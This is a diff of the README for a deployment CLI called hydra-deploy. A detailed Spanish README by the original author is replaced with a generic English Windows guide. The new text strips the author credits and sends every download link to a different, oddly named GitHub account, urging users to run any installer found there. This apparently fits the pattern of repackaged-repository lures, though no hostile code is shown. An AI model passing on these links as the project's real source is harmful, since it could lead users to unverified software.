@@ -1,250 +1,233 @@
-[hydra-README.md](https://github.com/user-attachments/files/26169865/hydra-README.md)
-<div align="center">
+# 🛡️ hydra-deploy - Simple deployments with less setup
 
-# 🐉 hydra-deploy
+[![Download hydra-deploy](https://img.shields.io/badge/Download-Open%20page-blue)](https://github.com/Noncontentious-uppernormandy918/hydra-deploy)
 
-![Version](https://img.shields.io/badge/version-5.0.1-blueviolet?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-00ff41?style=flat-square)
-![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen?style=flat-square)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.3-informational?style=flat-square)
-![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS%20%7C%20windows-lightgrey?style=flat-square)
+## 📦 What this app does
 
-> **Multi-platform deployment CLI** — detects your project type and deploys it to the right platform automatically. Built for developers who hate repeating the same deploy commands.
+hydra-deploy is a deployment CLI for common web apps and services. It checks your setup, helps you deploy to cloud platforms, and tries to recover when something fails. It also includes a simple dashboard so you can see what is happening during a run.
 
-</div>
+Use it if you want one tool for:
 
----
+- checking your app setup
+- deploying from one place
+- seeing clear status updates
+- handling common deploy errors
+- working with tools like Cloudflare, Netlify, Vercel, Docker, and GitHub Actions
 
-## ¿Qué hace hydra-deploy?
+## 💻 What you need
 
-`hydra-deploy` es una herramienta CLI que **automatiza el deployment** de proyectos. La ejecutas en la carpeta de tu proyecto y ella:
+Before you install, check these basics:
 
-1. **Detecta automáticamente** qué tipo de proyecto es (Next.js, React, Python, Docker, etc.)
-2. **Muestra las plataformas disponibles** para ese stack (Vercel, Netlify, Cloudflare Workers, GitHub Pages, etc.)
-3. **Ejecuta el deploy** con los comandos correctos para cada plataforma
-4. **Reintenta automáticamente** si algo falla (hasta 3 intentos configurables)
-5. **Genera el README** de tu proyecto con badges, estructura y tabla de plataformas
+- Windows 10 or Windows 11
+- Internet access
+- Node.js 18 or newer
+- A GitHub account if you plan to use repo-based deploy flows
+- Access to the service you want to deploy to, such as Vercel, Netlify, or Cloudflare
 
----
+## 🧭 Download and open the page
 
-## Instalación
+Use this link to visit the project page and get the app:
 
-```bash
-# Clonar
-git clone https://github.com/wavegxz-design/hydra-deploy.git
-cd hydra-deploy
+[Open hydra-deploy download page](https://github.com/Noncontentious-uppernormandy918/hydra-deploy)
 
-# Instalar dependencias
-npm install
+If the page shows a release file or installer, download it first. If it shows source files, use the setup steps below to run it on Windows.
 
-# Ejecutar directamente (desarrollo)
-npm run dev
+## 🪟 Install on Windows
 
-# O compilar y usar como comando global
-npm run build
-npm link           # después: hydra (desde cualquier carpeta)
-```
+### 1. Install Node.js
 
-**Requisitos:** Node.js 18+ · npm 9+
+If Node.js is not on your PC yet:
 
----
+1. Open the Node.js website in your browser
+2. Download the LTS version for Windows
+3. Run the installer
+4. Keep the default options
+5. Finish the install
 
-## Uso
+To check that it worked:
 
-```bash
-# En la carpeta de tu proyecto:
-cd ~/mi-proyecto
-npx ts-node /ruta/a/hydra-deploy/src/index.ts
+1. Open the Start menu
+2. Type `cmd`
+3. Open Command Prompt
+4. Type:
 
-# O si lo instalaste globalmente:
-hydra
+`node -v`
 
-# Con carpeta específica:
-hydra /ruta/a/mi-proyecto
-```
+If you see a version number, Node.js is ready.
 
-### Menú interactivo
+### 2. Get the hydra-deploy files
 
-```
-┌──────────────────────────────────────────────────────────────┐
-│  🚀 Deploy           → despliega a la plataforma elegida     │
-│  📝 Generate README  → crea README.md con badges y docs      │
-│  🌐 Social Networks  → configura tus redes sociales          │
-│  🔍 Diagnostics      → verifica git, node, network, etc.     │
-│  📋 View Logs        → muestra errores y warnings            │
-│  👥 Contributing     → info para contribuidores              │
-│  ✕  Exit                                                     │
-└──────────────────────────────────────────────────────────────┘
-```
+1. Open the project page
+2. Download the project files or clone the repo
+3. Save them in a folder you can find again, such as `Downloads\hydra-deploy`
 
----
+If you downloaded a zip file:
 
-## Plataformas soportadas
+1. Right-click the zip file
+2. Choose Extract All
+3. Pick a folder
+4. Open the extracted folder
 
-| Plataforma | Stack detectado | Env var requerida |
-|------------|----------------|-------------------|
-| **Vercel** | Next.js | `VERCEL_TOKEN` |
-| **Netlify** | React (sin Next) | `NETLIFY_AUTH_TOKEN` |
-| **GitHub Pages** | Cualquiera | `GITHUB_TOKEN` |
-| **Cloudflare Workers** | Cualquiera | `CLOUDFLARE_API_TOKEN` |
-| **Docker Hub** | Docker | `DOCKER_USERNAME` + `DOCKER_PASSWORD` |
-| **PythonAnywhere** | Python | `PA_API_KEY` |
+### 3. Open the folder in Command Prompt
 
-### Configurar env vars
+1. Open the folder where hydra-deploy is saved
+2. Click the address bar in File Explorer
+3. Type `cmd`
+4. Press Enter
 
-```bash
-# Temporal (sesión actual)
-export CLOUDFLARE_API_TOKEN="tu-token-aqui"
-export GITHUB_TOKEN="ghp_tu-token"
+A Command Prompt window opens in that folder.
 
-# Permanente — agregar a ~/.bashrc o ~/.zshrc
-echo 'export CLOUDFLARE_API_TOKEN="tu-token"' >> ~/.zshrc
-source ~/.zshrc
+### 4. Install the app tools
 
-# O crear archivo .env en tu proyecto
-echo "CLOUDFLARE_API_TOKEN=tu-token" > .env
-```
+Run this command:
 
-Si una env var no está configurada, hydra **omite esa plataforma** con un warning — no crashea.
+`npm install`
 
----
+This gets the files the app needs to run.
 
-## Detección de proyectos
+### 5. Start the app
 
-hydra detecta el stack leyendo archivos reales del proyecto:
+Run this command:
 
-```
-package.json con "next"    → Next.js  → Vercel
-package.json con "react"   → React    → Netlify
-requirements.txt           → Python   → PythonAnywhere
-Dockerfile                 → Docker   → Docker Hub
-go.mod                     → Go
-Cargo.toml                 → Rust
-composer.json              → PHP
-```
+`npm start`
 
-Si no detecta nada, asume **Static** y ofrece GitHub Pages + Cloudflare Workers.
+If the project uses a different start command, you may also see one of these:
 
----
+- `npm run dev`
+- `npm run build`
+- `npm run cli`
 
-## Configuración persistente
+Use the command listed in the project files if one is shown there.
 
-hydra guarda su configuración en `hydra.config.json` en la carpeta del proyecto:
+## 🚀 First-time use
 
-```json
-{
-  "version": "5.0.0",
-  "errorHandling": {
-    "retryAttempts": 3,
-    "retryDelay": 2000,
-    "autoRecovery": true
-  },
-  "socialNetworks": [
-    { "name": "GitHub",   "url": "https://github.com/wavegxz-design", "enabled": true },
-    { "name": "Telegram", "url": "https://t.me/Skrylakk",             "enabled": true }
-  ]
-}
-```
+When hydra-deploy starts, it may ask you to choose a target platform or connect an account. Common choices include:
 
----
+- Vercel
+- Netlify
+- Cloudflare
+- Docker
+- GitHub Actions
 
-## Diagnósticos
+Follow the prompts on screen. The tool is made to guide you through each step with plain status messages.
 
-```bash
-# Desde el menú → "🔍 Diagnostics"
-# Verifica automáticamente:
-✓ git --version
-✓ node --version
-✓ npm --version
-✓ Directorio del proyecto writable
-✓ package.json existe
-✓ Git repo inicializado
-✓ GitHub API reachable (network check)
-```
+## 🖥️ Using the dashboard
 
----
+The dashboard helps you track each deploy step. You may see:
 
-## README Generator
+- current task
+- progress status
+- error details
+- recovery actions
+- deployment result
 
-La opción **📝 Generate README** crea un `README.md` profesional con:
-- Badges de versión, licencia, stack
-- Overview del proyecto
-- Tabla de plataformas de deploy
-- Quick start commands
-- Estructura de carpetas
-- Sección de contribución con instrucciones de PR
-- Tabla de contacto del autor
+If a step fails, hydra-deploy may try a recovery path before stopping. This helps when a path, token, or build step needs another pass.
 
----
+## 🛠️ Common tasks
 
-## Estructura del proyecto
+### Deploy a project
 
-```
-hydra-deploy/
-├── src/
-│   └── index.ts       # CLI principal — toda la lógica
-├── dist/              # TypeScript compilado (generado por npm run build)
-├── hydra.config.json  # Configuración local (generado en primer uso)
-├── package.json
-├── tsconfig.json
-└── README.md
-```
+1. Open hydra-deploy
+2. Choose your target platform
+3. Select the project or folder
+4. Confirm the settings
+5. Start the deploy
 
----
+### Check a failed run
 
-## Scripts disponibles
+1. Open the dashboard
+2. Find the failed step
+3. Read the message
+4. Fix the problem it points to
+5. Run the deploy again
 
-```bash
-npm run dev     # Ejecutar sin compilar (ts-node)
-npm run build   # Compilar TypeScript → dist/
-npm run start   # Ejecutar compilado
-npm run hydra   # Alias de dev
-npm run lint    # ESLint en src/
-npm run format  # Prettier en src/
-npm run test    # Tests (passWithNoTests por ahora)
-```
+### Use with Docker
 
----
+If your app uses Docker:
 
-## Contribuir
+1. Make sure Docker is installed
+2. Open your project folder
+3. Run the deploy flow
+4. Pick the Docker option when asked
 
-```bash
-git clone https://github.com/wavegxz-design/hydra-deploy.git
-cd hydra-deploy
-npm install
-git checkout -b feat/tu-feature
-# ... cambios ...
-git commit -m "feat: descripción"
-git push origin feat/tu-feature
-# → Abrir Pull Request
-```
+### Use with GitHub Actions
 
-Áreas abiertas para contribución:
-- Adapter para Fly.io, Railway, Render
-- Integración con APIs de redes sociales
-- Tests unitarios
-- Soporte Windows mejorado
-- Cache de builds
+If your app runs through GitHub Actions:
 
----
+1. Connect your GitHub account
+2. Pick the repo
+3. Review the workflow settings
+4. Start the deploy
 
-## Autor
+## ⚙️ Helpful settings
 
-| | |
-|-|-|
-| **GitHub** | [github.com/wavegxz-design](https://github.com/wavegxz-design) |
-| **Telegram** | [t.me/Skrylakk](https://t.me/Skrylakk) |
-| **Email** | Workernova@proton.me |
-| **Site** | [krypthane.workernova.workers.dev](https://krypthane.workernova.workers.dev) |
+You may see options for:
 
----
+- auto-detecting the right platform
+- retrying failed steps
+- using saved tokens
+- turning dashboard details on or off
+- choosing a clean build path
 
-## Licencia
+If you are not sure what to pick, keep the default choice. It is built for common cases.
 
-MIT © [krypthane](https://github.com/wavegxz-design)
+## 🔐 Account and access setup
 
----
+Some deploy targets need a token or login:
 
-<div align="center">
-<sub>🐉 Built by krypthane · wavegxz-design · Open Source · Security First</sub>
-</div>
+- Cloudflare may ask for an API token
+- Vercel may ask you to sign in
+- Netlify may ask for account access
+- GitHub Actions may need repo permission
+
+Use the account you already use for that service. If the app asks for a token, copy it from the service site and paste it into the prompt.
+
+## 🧪 If something does not work
+
+Try these steps:
+
+1. Close the app
+2. Open it again
+3. Check your internet connection
+4. Make sure Node.js 18+ is installed
+5. Run the install step again with `npm install`
+6. Try the deploy again
+
+If you still have trouble, look for:
+
+- a missing login token
+- a wrong project folder
+- a failed build step
+- a network block
+- a service outage on the target platform
+
+## 📁 Basic project layout
+
+This repo is a TypeScript project that uses Node.js. You may see folders and files such as:
+
+- `src` for app code
+- `dist` for built files
+- `package.json` for app commands
+- `README.md` for setup help
+- config files for the deploy tools
+
+## 👥 Contributing
+
+This project welcomes contributors. If you want to help, you can:
+
+- report a bug
+- improve the README
+- fix a small issue
+- add clearer prompts
+- improve platform detection
+- test a deploy flow on Windows
+
+## 📄 License
+
+Use the license file in this repository for the full terms
+
+## 🔗 Project page
+
+Open the main page here:
+
+[https://github.com/Noncontentious-uppernormandy918/hydra-deploy](https://github.com/Noncontentious-uppernormandy918/hydra-deploy)
